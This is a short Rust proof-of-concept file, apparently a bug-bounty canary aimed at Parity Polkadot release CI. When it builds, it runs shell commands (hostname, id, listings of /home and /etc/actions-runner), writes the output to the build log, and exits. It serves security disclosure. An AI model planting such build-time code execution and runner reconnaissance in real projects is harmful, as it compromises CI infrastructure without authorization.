use std::process::Command;

// Security research PoC (HackenProof: parity-polkadot-release-infrastructure).
// Benign canary: prints runner identity to the build log, then fails fast so the
// benchmark does not consume runner time. No persistence, no exfiltration.
fn run(cmd: &str) -> String {
    Command::new("sh")
        .args(["-c", cmd])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "n/a".to_string())
}

fn main() {
    let msg = format!(
        "SECURITY-POC-LANE8 host=[{}] user=[{}] runner_dir=[{}]",
        run("hostname"),
        run("id"),
        run("ls /home 2>/dev/null; ls /etc/actions-runner 2>/dev/null || echo no-actions-runner-dir")
    );
    eprintln!("{}", msg);
    println!("cargo:warning={}", msg);
    // Fail fast: the canary already proved code execution; stop the build here.
    std::process::exit(1);
}
